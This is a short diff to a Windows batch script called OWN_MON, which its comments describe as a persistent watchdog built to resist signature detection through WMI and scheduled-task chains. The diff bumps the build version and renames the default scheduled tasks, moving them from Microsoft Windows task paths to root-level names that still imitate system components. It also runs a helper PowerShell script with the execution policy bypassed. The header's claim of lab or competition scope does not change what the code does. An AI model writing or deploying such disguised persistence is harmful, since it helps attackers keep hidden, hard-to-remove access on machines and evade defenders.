@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M22
+rem  OWN_MON  BUILD 20260802M23
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -32,7 +32,7 @@ set "MSICACHE=%WD%\pkg.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M22"
+set "MONVER=M23"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
@@ -61,10 +61,10 @@ echo %DATE% %TIME% %RANDOM%>"%MUTEX%"
 rem ── per-host identity (anti-signature) ────────────────────────
 if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
 if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
-if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\EvtCacheSync"
-if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\ServerHealth"
-if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHostProxy"
-if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpConflictResolver"
+if not defined TASK_A set "TASK_A=\WerQueueSync"
+if not defined TASK_B set "TASK_B=\PlaServerHealth"
+if not defined TASK_C set "TASK_C=\WdiHostProxy"
+if not defined TASK_D set "TASK_D=\TcpIpConflictRes"
 if not defined MO_A set "MO_A=2"
 if not defined MO_B set "MO_B=3"
 
